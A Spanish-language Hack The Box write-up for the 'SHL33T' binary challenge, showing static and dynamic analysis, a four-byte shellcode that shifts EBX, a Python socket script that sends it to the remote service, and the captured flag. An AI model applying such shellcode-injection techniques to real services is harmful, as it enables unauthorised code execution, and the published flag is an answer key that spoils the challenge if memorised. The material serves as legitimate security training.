
# Write-up – SHL33T (Hack The Box)

## 🧩 Introducción

El reto **SHL33T** es un desafío de **ingeniería inversa y explotación binaria básica** cuyo objetivo es manipular el valor de un registro para cumplir una condición interna del programa y obtener la flag. El ejercicio está orientado a trabajar conceptos de **arquitectura x86_64**, **shellcode**, **análisis estático** y **análisis dinámico**.

---

## 🛠️ Herramientas utilizadas

- **Ghidra** – Herramienta de ingeniería inversa para análisis estático del binario
- **GDB** – Depurador para análisis dinámico y control del flujo de ejecución
- **Python 3** – Automatización de la explotación remota
- **Linux x86_64**

---

## 🔍 Análisis estático con Ghidra

El binario fue cargado en **Ghidra** para analizar su lógica interna. Tras decompilar la función `main`, se observaron los siguientes puntos clave:

- El registro **EBX** se inicializa con el valor:
  ```
  ebx = 0x1337
  ```
- Posteriormente, el programa compara dicho valor con:
  ```
  ebx == 0x13370000
  ```
- Si la comparación es correcta, el binario ejecuta:
  ```
  system("cat flag.txt")
  ```

Además, se identificó una secuencia crítica donde el programa:

- Reserva memoria con `mmap`
- Lee datos desde la entrada estándar
- Ejecuta directamente el contenido leído

Esto indica claramente una **ejecución de código controlada por el usuario**.

---

## 🧠 Análisis del reto

La diferencia entre el valor inicial y el valor esperado:

- Valor inicial: `0x00001337`
- Valor objetivo: `0x13370000`

corresponde a un **desplazamiento lógico a la izquierda de 16 bits**:

```
0x1337 << 16 = 0x13370000
```

Por tanto, la instrucción necesaria para resolver el reto es:

```
shl ebx, 16
```

---

## 🧪 Análisis dinámico con GDB

Mediante **GDB** se confirmó el flujo de ejecución del binario:

1. Inicialización del registro `EBX`
2. Reserva de memoria ejecutable con `mmap`
3. Lectura de hasta 4 bytes desde la entrada
4. Ejecución del contenido leído
5. Comparación final del valor de `EBX`

Esto confirmó la viabilidad de inyectar **shellcode mínimo** para modificar directamente el registro.

---

## 💣 Shellcode utilizado

El shellcode necesario es extremadamente simple:

```
shl ebx, 16
ret
```

Representación en bytes (x86_64):

```
C1 E3 10 C3
```

---

## 🚀 Explotación remota

Para explotar el servicio remoto, se desarrolló un script en **Python** que establece una conexión por socket, envía el shellcode y lee toda la salida del servidor hasta el cierre de la conexión.

```
import socket

s = socket.socket()
s.connect(("HOST", PUERTO))

# shellcode: shl ebx, 16 ; ret
s.send(b"\xC1\xE3\x10\xC3")

while True:
    data = s.recv(4096)
    if not data:
        break
    print(data.decode(errors="ignore"), end="")

s.close()
```

---

## 🏁 Resultado

Tras ejecutar el shellcode:

- El registro `EBX` queda con el valor `0x13370000`
- La condición interna del programa se cumple
- Se ejecuta `cat flag.txt`
- Se obtiene la flag:

```
HTB{sh1ft_2_th3_l3ft_sh1ft_2_th3_r1ght_77447a52efe4b5c0b1d022ff66bd278b}
```

---

## 📌 Conclusión

Este reto demuestra la importancia de:

- Comprender el funcionamiento de los registros
- Identificar puntos de ejecución controlada
- Utilizar herramientas de ingeniería inversa como **Ghidra**
- Aplicar operaciones a nivel de bits para resolver validaciones internas

Un desafío limpio y didáctico para reforzar conceptos fundamentales de explotación binaria.

---

## ✍️ Autor

**unax**  
Hack The Box – Binary Exploitation
